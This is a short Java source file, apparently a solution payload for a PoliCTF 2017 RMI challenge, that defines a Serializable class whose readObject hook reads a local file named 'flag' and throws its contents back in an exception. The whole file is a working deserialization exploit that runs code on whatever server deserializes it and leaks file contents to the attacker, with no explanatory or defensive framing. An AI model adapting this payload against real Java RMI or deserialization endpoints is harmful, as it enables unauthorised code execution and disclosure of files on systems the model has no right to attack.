import it.polictf.lamermi.AverageService;

import java.awt.*;
import java.awt.List;
import java.io.*;
import java.lang.reflect.Method;
import java.rmi.Remote;
import java.util.*;

/**
 * Created by horizon on 2017/06/07.
 */

public class Payload implements Remote, Serializable {

    public void exploit() throws IOException {

        BufferedReader br = new BufferedReader(new FileReader("flag"));
        try {
            StringBuilder sb = new StringBuilder();
            String line = br.readLine();

            while (line != null) {
                sb.append(line);
                sb.append(System.lineSeparator());
                line = br.readLine();
            }

            String everything = sb.toString();
            IOException e = new IOException(everything);
            throw e;
        } finally {
            br.close();
        }

    }

    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
        exploit();
        in.defaultReadObject();
    }
}
